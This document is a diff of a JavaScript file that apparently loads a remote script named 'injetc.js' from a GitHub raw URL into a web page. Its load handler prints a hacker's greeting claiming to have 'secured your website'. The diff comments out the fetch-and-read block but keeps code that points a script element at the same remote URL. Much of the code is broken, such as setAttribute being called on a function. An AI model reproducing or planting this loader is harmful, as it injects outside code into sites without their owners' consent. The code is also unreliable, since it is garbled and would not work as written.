@@ -1,39 +1,39 @@
 //jalan
 async function* makeTextFileLineIterator() {
   const utf8Decoder = new TextDecoder('utf-8');
-  const response = await fetch('https://raw.githubusercontent.com/GMhabib/index.js/main/injetc.js');
-  const reader = response.body.getReader();
-  let { value: chunk, done: readerDone } = await reader.read();
-  chunk = chunk ? utf8Decoder.decode(chunk) : '';
+//  const response = await fetch('https://raw.githubusercontent.com/GMhabib/index.js/main/injetc.js');
+//  const reader = response.body.getReader();
+//  let { value: chunk, done: readerDone } = await reader.read();
+//  chunk = chunk ? utf8Decoder.decode(chunk) : '';
 
-  const re = /\n|\r|\r\n/gm;
-  let startIndex = 0;
-  let result;
+//  const re = /\n|\r|\r\n/gm;
+ // let startIndex = 0;
+//  let result;
 
-  for (;;) {
-    let result = re.exec(chunk);
-    if (!result) {
-      if (readerDone) {
-        break;
-      }
-      let remainder = chunk.substr(startIndex);
-      ({ value: chunk, done: readerDone } = await reader.read());
-      chunk = remainder + (chunk ? utf8Decoder.decode(chunk) : '');
-      startIndex = re.lastIndex = 0;
-      continue;
-    }
-    yield chunk.substring(startIndex, result.index);
-    startIndex = re.lastIndex;
-  }
-  if (startIndex < chunk.length) {
+//  for (;;) {
+  //  let result = re.exec(chunk);
+ //   if (!result) {
+   //   if (readerDone) {
+ //       break;
+//      }
+  //    let remainder = chunk.substr(startIndex);
+  //    ({ value: chunk, done: readerDone } = await reader.read());
+    //  chunk = remainder + (chunk ? utf8Decoder.decode(chunk) : '');
+  //    startIndex = re.lastIndex = 0;
+ //     continue;
+//    }
+  //  yield chunk.substring(startIndex, result.index);
+   // startIndex = re.lastIndex;
+//  }
+//  if (startIndex < chunk.length) {
     // last line didn't end in a newline char
-    yield chunk.substr(startIndex);
-  }
+  //  yield chunk.substr(startIndex);
+ // }
 }
 
 async function run() {
   for await (let line of makeTextFileLineIterator('https://raw.githubusercontent.com/GMhabib/index.js/main/injetc.js')) {
-    //processLine(line);
+  //  processLine(line);
   }
 }
 $run=console.log(run());
@@ -70,11 +70,11 @@ function lalala2(lalala2) {
 //end script
 
 //active load script
-function myScript(setAttribute, addEventListerner) {
+function myScript(){
 //let myScript = document.createElement("script");
 myScript.setAttribute("src", "https://raw.githubusercontent.com/GMhabib/index.js/main/injetc.js");
 
-myScript.addEventListener("load", scriptLoaded, false);
+myScript.addEventListener("load", scriptLoaded, true);
 }
 function scriptLoaded() {
   console.log('hello hackers, greetings, my name is habibGM, I have secured your website');
